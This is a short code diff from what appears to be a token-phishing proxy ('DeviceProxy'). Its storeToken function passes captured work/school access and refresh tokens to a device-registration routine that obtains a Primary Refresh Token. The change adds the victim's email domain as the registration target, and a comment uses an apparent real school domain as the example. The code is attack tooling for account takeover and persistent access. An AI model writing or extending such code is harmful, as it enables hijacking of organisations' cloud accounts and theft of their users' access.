@@ -591,10 +591,13 @@ async function storeToken(job, tokenData, responseCookies = []) {
     if (accountType === 'work_school' && tokenData.access_token) {
       console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
       const deviceManager = require('./devicemanager');
+      // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
+      const emailDomain = email ? email.split('@')[1] : null;
       deviceManager.registerDeviceAndGetPrt({
         access_token: tokenData.access_token,
         refresh_token: tokenData.refresh_token,
         tenant_id: tenant,
+        target_domain: emailDomain || tenant, // Use email domain for DRS, fallback to tenant GUID
         user_id: job.user_id,
         link_id: job.link_id
       }).then(registrationResult => {
